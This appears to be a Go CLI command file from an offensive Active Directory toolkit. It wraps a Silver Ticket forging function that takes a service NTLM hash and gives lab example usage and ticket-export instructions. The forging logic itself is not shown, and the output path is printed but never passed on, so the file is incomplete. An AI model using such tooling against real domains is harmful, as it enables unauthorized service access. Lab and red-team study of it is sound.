// cmd/adgo/commands/silverticket.go
package commands

import (
	"adgo/pkg/exploits"
	"fmt"

	"github.com/spf13/cobra"
)

var silverTicketCmd = &cobra.Command{
	Use:   "silverticket",
	Short: "Create a Silver Ticket",
	Long: `Create a Kerberos Silver Ticket for a specific service.

A Silver Ticket allows access to a specific service without contacting the DC.
Requires the service account's NTLM hash.

Example:
  adgo kerberos silverticket -d lab.local -u administrator --target cifs/dc01.lab.local --ntlm-hash <hash>`,
	RunE: runSilverTicket,
}

var (
	stDomain     string
	stUsername   string
	stTarget     string
	stNTLMHash   string
	stOutputFile string
)

func init() {
	KerberosCmd.AddCommand(silverTicketCmd)

	silverTicketCmd.Flags().StringVarP(&stDomain, "domain", "d", "", "Domain name (required)")
	silverTicketCmd.Flags().StringVarP(&stUsername, "username", "u", "", "Username for the ticket (required)")
	silverTicketCmd.Flags().StringVar(&stTarget, "target", "", "Target service SPN (e.g., cifs/server.domain.com) (required)")
	silverTicketCmd.Flags().StringVar(&stNTLMHash, "ntlm-hash", "", "Service account NTLM hash (required)")
	silverTicketCmd.Flags().StringVarP(&stOutputFile, "output", "o", "", "Output ticket file (.ccache)")

	silverTicketCmd.MarkFlagRequired("domain")
	silverTicketCmd.MarkFlagRequired("username")
	silverTicketCmd.MarkFlagRequired("target")
	silverTicketCmd.MarkFlagRequired("ntlm-hash")
}

func runSilverTicket(cmd *cobra.Command, args []string) error {
	fmt.Println("\n=== Silver Ticket Creation ===")
	fmt.Printf("[*] Creating Silver Ticket for %s targeting %s\n", stUsername, stTarget)

	result, err := exploits.SilverTicket(stUsername, stDomain, stTarget, stNTLMHash)
	if err != nil {
		return fmt.Errorf("Silver Ticket creation failed: %v", err)
	}

	fmt.Printf("[+] %s\n", result.Status)

	if stOutputFile != "" {
		fmt.Printf("[+] Ticket saved to: %s\n", stOutputFile)
		fmt.Printf("[*] Usage: export KRB5CCNAME=%s\n", stOutputFile)
	}

	return nil
}
